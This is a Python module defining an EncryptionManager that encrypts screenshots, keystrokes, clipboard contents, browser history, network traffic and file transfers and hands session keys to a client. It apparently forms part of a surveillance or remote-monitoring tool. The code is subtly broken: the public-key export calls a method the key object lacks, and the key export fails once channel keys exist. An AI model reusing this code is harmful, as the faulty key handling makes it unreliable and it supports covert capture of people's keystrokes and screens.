"""
Encryption Module
Secure encryption for sensitive data transmission including traffic and screenshots
"""
import base64
import os
import json
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Union
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import secrets

class EncryptionManager:
    """Manage encryption for various data types"""
    
    def __init__(self):
        # Session keys for different data types
        self.session_keys = {}
        self.encryption_settings = {
            'screenshots': {'enabled': True, 'algorithm': 'fernet'},
            'network_traffic': {'enabled': True, 'algorithm': 'fernet'},
            'keystrokes': {'enabled': True, 'algorithm': 'fernet'},
            'clipboard': {'enabled': True, 'algorithm': 'fernet'},
            'file_transfers': {'enabled': True, 'algorithm': 'fernet'},
            'process_data': {'enabled': True, 'algorithm': 'fernet'},
            'browser_history': {'enabled': True, 'algorithm': 'fernet'}
        }
        
        # RSA key pair for key exchange
        self.private_key = None
        self.public_key = None
        self._generate_rsa_keypair()
        
        # Initialize session keys
        self._initialize_session_keys()
    
    def _generate_rsa_keypair(self):
        """Generate RSA key pair for secure key exchange"""
        try:
            self.private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            self.public_key = self.private_key.public_key()
        except Exception as e:
            print(f"Error generating RSA keypair: {e}")
    
    def _initialize_session_keys(self):
        """Initialize Fernet keys for different data types"""
        for data_type in self.encryption_settings:
            if self.encryption_settings[data_type]['enabled']:
                self.session_keys[data_type] = Fernet.generate_key()
    
    def get_public_key_pem(self) -> str:
        """Get public key in PEM format for client"""
        if self.public_key:
            pem = self.public_key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            return pem.decode('utf-8')
        return None
    
    def get_session_key(self, data_type: str, encrypted: bool = False) -> Optional[str]:
        """Get session key for specific data type"""
        if data_type not in self.session_keys:
            return None
        
        key = self.session_keys[data_type]
        
        if encrypted and self.public_key:
            # Encrypt the session key with RSA public key
            try:
                encrypted_key = self.public_key.encrypt(
                    key,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                return base64.b64encode(encrypted_key).decode('utf-8')
            except Exception as e:
                print(f"Error encrypting session key: {e}")
                return None
        
        return base64.b64encode(key).decode('utf-8')
    
    def encrypt_data(self, data: Union[str, bytes, dict], data_type: str) -> Dict:
        """Encrypt data based on type"""
        if not self.encryption_settings.get(data_type, {}).get('enabled', False):
            return {
                'success': True,
                'encrypted': False,
                'data': data,
                'algorithm': 'none'
            }
        
        if data_type not in self.session_keys:
            return {
                'success': False,
                'error': f'No session key for data type: {data_type}'
            }
        
        try:
            # Convert data to bytes if needed
            if isinstance(data, dict):
                data_bytes = json.dumps(data).encode('utf-8')
            elif isinstance(data, str):
                data_bytes = data.encode('utf-8')
            else:
                data_bytes = data
            
            # Encrypt with Fernet
            cipher_suite = Fernet(self.session_keys[data_type])
            encrypted_data = cipher_suite.encrypt(data_bytes)
            
            return {
                'success': True,
                'encrypted': True,
                'data': base64.b64encode(encrypted_data).decode('utf-8'),
                'algorithm': 'fernet',
                'data_type': data_type,
                'timestamp': datetime.now().isoformat(),
                'size': len(encrypted_data)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Encryption failed: {str(e)}'
            }
    
    def decrypt_data(self, encrypted_data: str, data_type: str) -> Dict:
        """Decrypt data based on type"""
        if data_type not in self.session_keys:
            return {
                'success': False,
                'error': f'No session key for data type: {data_type}'
            }
        
        try:
            # Decode base64
            encrypted_bytes = base64.b64decode(encrypted_data)
            
            # Decrypt with Fernet
            cipher_suite = Fernet(self.session_keys[data_type])
            decrypted_bytes = cipher_suite.decrypt(encrypted_bytes)
            
            # Try to parse as JSON, fallback to string
            try:
                decrypted_data = json.loads(decrypted_bytes.decode('utf-8'))
            except (json.JSONDecodeError, UnicodeDecodeError):
                decrypted_data = decrypted_bytes.decode('utf-8', errors='ignore')
            
            return {
                'success': True,
                'data': decrypted_data,
                'data_type': data_type
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Decryption failed: {str(e)}'
            }
    
    def encrypt_screenshot(self, image_data: bytes) -> Dict:
        """Encrypt screenshot data"""
        return self.encrypt_data(image_data, 'screenshots')
    
    def encrypt_network_traffic(self, traffic_data: dict) -> Dict:
        """Encrypt network traffic data"""
        return self.encrypt_data(traffic_data, 'network_traffic')
    
    def encrypt_keystrokes(self, keystroke_data: dict) -> Dict:
        """Encrypt keystroke data"""
        return self.encrypt_data(keystroke_data, 'keystrokes')
    
    def encrypt_clipboard(self, clipboard_data: str) -> Dict:
        """Encrypt clipboard data"""
        return self.encrypt_data(clipboard_data, 'clipboard')
    
    def encrypt_file_chunk(self, file_data: bytes) -> Dict:
        """Encrypt file transfer data"""
        return self.encrypt_data(file_data, 'file_transfers')
    
    def encrypt_process_data(self, process_data: dict) -> Dict:
        """Encrypt process monitoring data"""
        return self.encrypt_data(process_data, 'process_data')
    
    def encrypt_browser_history(self, history_data: dict) -> Dict:
        """Encrypt browser history data"""
        return self.encrypt_data(history_data, 'browser_history')
    
    def update_encryption_settings(self, data_type: str, enabled: bool, algorithm: str = 'fernet') -> Dict:
        """Update encryption settings for a data type"""
        if data_type not in self.encryption_settings:
            return {
                'success': False,
                'error': f'Unknown data type: {data_type}'
            }
        
        self.encryption_settings[data_type]['enabled'] = enabled
        self.encryption_settings[data_type]['algorithm'] = algorithm
        
        # Regenerate session key if enabling encryption
        if enabled and data_type not in self.session_keys:
            self.session_keys[data_type] = Fernet.generate_key()
        
        return {
            'success': True,
            'message': f'Encryption settings updated for {data_type}',
            'settings': self.encryption_settings[data_type]
        }
    
    def get_encryption_status(self) -> Dict:
        """Get current encryption status for all data types"""
        status = {
            'encryption_enabled': True,
            'rsa_keypair_available': self.private_key is not None,
            'data_types': {}
        }
        
        for data_type, settings in self.encryption_settings.items():
            status['data_types'][data_type] = {
                'enabled': settings['enabled'],
                'algorithm': settings['algorithm'],
                'key_available': data_type in self.session_keys,
                'key_id': hashlib.sha256(self.session_keys.get(data_type, b'')).hexdigest()[:8]
            }
        
        return {
            'success': True,
            'status': status
        }
    
    def rotate_session_keys(self, data_types: List[str] = None) -> Dict:
        """Rotate session keys for specified data types or all"""
        if data_types is None:
            data_types = list(self.encryption_settings.keys())
        
        rotated = []
        for data_type in data_types:
            if data_type in self.encryption_settings:
                if self.encryption_settings[data_type]['enabled']:
                    self.session_keys[data_type] = Fernet.generate_key()
                    rotated.append(data_type)
        
        return {
            'success': True,
            'message': f'Session keys rotated for: {", ".join(rotated)}',
            'rotated_keys': rotated,
            'timestamp': datetime.now().isoformat()
        }
    
    def export_client_keys(self) -> Dict:
        """Export all session keys for client synchronization"""
        client_keys = {}
        
        for data_type, key in self.session_keys.items():
            if self.encryption_settings[data_type]['enabled']:
                client_keys[data_type] = base64.b64encode(key).decode('utf-8')
        
        return {
            'success': True,
            'keys': client_keys,
            'public_key': self.get_public_key_pem(),
            'timestamp': datetime.now().isoformat()
        }
    
    def create_secure_channel(self, client_public_key_pem: str) -> Dict:
        """Create a secure channel with client using key exchange"""
        try:
            # Load client public key
            client_public_key = serialization.load_pem_public_key(
                client_public_key_pem.encode('utf-8'),
                backend=default_backend()
            )
            
            # Generate a shared secret (session key for the channel)
            channel_key = Fernet.generate_key()
            
            # Encrypt the channel key with client's public key
            encrypted_channel_key = client_public_key.encrypt(
                channel_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            # Store the channel key
            channel_id = secrets.token_hex(16)
            self.session_keys[f'channel_{channel_id}'] = channel_key
            
            return {
                'success': True,
                'channel_id': channel_id,
                'encrypted_channel_key': base64.b64encode(encrypted_channel_key).decode('utf-8'),
                'server_public_key': self.get_public_key_pem()
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to create secure channel: {str(e)}'
            }

# Global encryption manager instance
encryption_manager = EncryptionManager()